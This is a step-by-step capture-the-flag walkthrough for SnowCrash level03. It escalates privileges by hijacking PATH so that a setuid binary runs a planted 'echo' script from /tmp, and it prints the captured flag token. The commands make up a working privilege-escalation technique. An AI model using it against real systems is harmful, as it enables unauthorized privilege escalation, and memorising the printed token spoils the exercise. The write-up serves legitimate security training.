# SnowCrash Level03 Guide
This guide will walk you through the process of finding the password for the `flag03` user.

## Procedure:

1. **Examine files in the current directory**
   
We start by displaying the files and folders of the current directory.
```bash
ls -l
```
We find a file named level03 with the following permissions:
```bash
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```
The file is executable by the owner, the group, and others, so by everyone.
Additionally, the file is executed with the owner’s and group's rights (setuid, setgid).

2. **Execute level03**

We execute the file level03.
```bash
./level03
```
The program displays the following message:
```bash
Exploit me
```

3. **Analyse level03**

We look at where the message comes from.
```bash
strings level03 | grep "Exploit"
```
Returns
```bash
/usr/bin/env echo Exploit me
```
The program uses the echo command to display the message.
We are going to execute the getflag command instead of echo.
For this, we will create a file named echo that executes getflag when called.

4. **Collect the getflag command**

We retrieve the absolute path of the getflag command.
```bash
which getflag
```
Returns
```bash
/bin/getflag
```

5. **Try to create the echo file**

Then we create the echo file by inserting the getflag command.
```bash
echo '/bin/getflag' > echo
```
Returns
```bash
bash: echo: Permission denied
```
We do not have write permissions in the current directory.

6. **Find a directory with write permissions**

We start by finding a directory where we have write permissions.
```bash
find / -type d -writable 2>/dev/null
// searches for directories where the current user has write permissions
// find / : starting from the root of the system
// -type d : directory
// -writable : write permissions
// 2>/dev/null : redirects stderr to /dev/null
```
We find the /tmp directory where we have write permissions.
We move to the /tmp directory.
```bash
cd /tmp/
```

7. **Create the echo file**

We create the echo file.
```bash
echo '/bin/getflag' > echo
```
We give execution rights to the echo file.
```bash
chmod 777 echo
```
We check the permissions of the echo file.
```bash
ls -l echo
```
Returns
```bash
-rwxrwxrwx 1 level03 level03 XXX echo
```

8. **Add /tmp to the PATH**
Now, we need to add /tmp to the PATH so that the level03 program executes the echo file in /tmp instead of the one in /usr/bin/env.
```bash
export PATH=/tmp:$PATH
```
We add /tmp at the beginning of the PATH so that the level03 program executes the echo file in /tmp before the one in /usr/bin/env.
We verify that /tmp has been added to the PATH.
```bash
printenv | grep "PATH"
```
Returns
```bash
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

9. **Exploit level03**

We return to the directory /home/user/level03.
```bash
cd /home/user/level03/
```
Then we execute the level03 program.
```bash
./level03
```
Returns
```bash
Check flag. Here is your token: qi0maab88jeaj46qoumi7maus
```

Congratulations! We have successfully obtained the token!
We thus access level 04.
```bash
su level04
```